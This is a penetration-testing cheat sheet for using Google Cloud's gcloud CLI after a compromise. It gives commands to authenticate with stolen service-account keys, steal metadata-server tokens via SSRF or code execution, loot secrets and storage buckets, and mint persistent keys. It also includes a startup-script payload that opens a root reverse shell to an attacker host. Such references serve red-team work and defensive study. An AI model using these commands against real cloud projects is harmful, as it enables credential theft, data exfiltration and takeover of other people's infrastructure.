# gcloud CLI

**Tags:** `#gcp` `#cloud` `#gcloud` `#gsutil` `#postexploitation` `#credentialabuse` `#privesc` `#metadata`

Google Cloud's official CLI (`gcloud`, plus `gsutil`/`bq`). The GCP counterpart to
[[Tools/Cloud/aws-cli|aws-cli]] / [[Tools/Cloud/azure-cli|azure-cli]]: authenticate with a
stolen **service-account key** or a metadata-server token, enumerate the project, loot
Secret Manager and Storage, run code on Compute Engine via metadata **startup-scripts**, and
escalate through IAM. For the deep IAM-privesc technique catalogue (impersonation chains,
`actAs`, dangerous roles) see [[Tools/Cloud/GCP-IAM-PrivEsc|GCP-IAM-PrivEsc]] — this note is
the tool/loot reference.

**Source:** https://cloud.google.com/sdk/gcloud
**Install:** `curl https://sdk.cloud.google.com | bash` (installs to `~/google-cloud-sdk/`), or the distro package. Add `~/google-cloud-sdk/bin` to `PATH`.

```bash
# --- Authenticate ---
gcloud auth activate-service-account --key-file=key.json     # stolen SA JSON key (most common)
gcloud auth login                                            # interactive user (browser / --no-launch-browser)
gcloud config set project <project-id>
gcloud auth list                                             # accounts already cached on this host
```

---

## Who Am I / Context

```bash
gcloud config list                       # active account + project
gcloud auth print-access-token           # OAuth2 token for REST APIs (hand to curl/Burp)
gcloud auth print-identity-token         # OIDC identity token (for IAP / Cloud Run / functions)
gcloud projects list                     # projects this identity can see
```

---

## Steal Credentials from the Metadata Server

From code-exec or SSRF on a GCE instance, pull the attached service account's token
(note the mandatory `Metadata-Flavor` header — it blocks naive SSRF):

```bash
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# list attached SAs and their scopes:
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

---

## Enumerate

Quick surface below; the full IAM/service enumeration recipe lives in
[[Tools/Cloud/GCP-IAM-PrivEsc|GCP-IAM-PrivEsc]].

```bash
gcloud projects get-iam-policy <project-id>                    # who has what on the project
gcloud iam service-accounts list                               # SAs (impersonation targets)
gcloud compute instances list
gcloud storage ls                                              # buckets (or: gsutil ls)
gcloud container clusters list                                 # GKE clusters
```

---

## Loot Secrets & Storage

```bash
gcloud secrets list
gcloud secrets versions access latest --secret=<name>          # the secret value
gcloud storage ls -r gs://<bucket>/                            # recurse a bucket
gcloud storage cp gs://<bucket>/<object> ./loot                # (gsutil cp also works)
# Compute instance metadata often holds startup secrets:
gcloud compute instances describe <vm> --zone <zone> --format='value(metadata)'
```

---

## Code Execution on Compute Engine

No dedicated "run-command" like AWS SSM / Azure — instead abuse the **startup-script**
metadata (runs as root on next boot/reset) or push an SSH key:

```bash
# Startup-script → root RCE (requires compute.instances.setMetadata; runs on reset)
gcloud compute instances add-metadata <vm> --zone <zone> \
  --metadata startup-script='#! /bin/bash
bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
gcloud compute instances reset <vm> --zone <zone>

# Or just have gcloud provision an SSH key and log in
gcloud compute ssh <vm> --zone <zone>
```

---

## Impersonation & Persistence

```bash
# Impersonate a more-privileged SA for a single command (needs roles/iam.serviceAccountTokenCreator)
gcloud storage ls --impersonate-service-account=<sa>@<proj>.iam.gserviceaccount.com
gcloud auth print-access-token --impersonate-service-account=<sa>@<proj>.iam.gserviceaccount.com

# Persistence: mint a downloadable key for an SA you can write to
gcloud iam service-accounts keys create key.json --iam-account=<sa>@<proj>.iam.gserviceaccount.com
```

> [!warning] `gcloud` caches credentials (and downloaded SA keys) under `~/.config/gcloud/`
> in cleartext — `credentials.db` / `access_tokens.db` / `legacy_credentials/`. On a
> compromised host that directory is a credential to loot; clear it on your own box after.

> [!note] **See also** — [[Tools/Cloud/GCP-IAM-PrivEsc|GCP-IAM-PrivEsc]] (the IAM impersonation/privesc chains); GCP tooling: [[Tools/Cloud/gcpwn|gcpwn]] (exploitation framework), [[Tools/Cloud/gcp_scanner|gcp_scanner]] (what these creds can reach), [[Tools/Cloud/GCPBucketBrute|GCPBucketBrute]] (GCS buckets), [[Tools/Cloud/PurplePanda|PurplePanda]] (cross-platform attack paths); [[Tools/Cloud/ScoutSuite|ScoutSuite]] (misconfig audit). AWS/Azure equivalents [[Tools/Cloud/aws-cli|aws-cli]] / [[Tools/Cloud/azure-cli|azure-cli]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
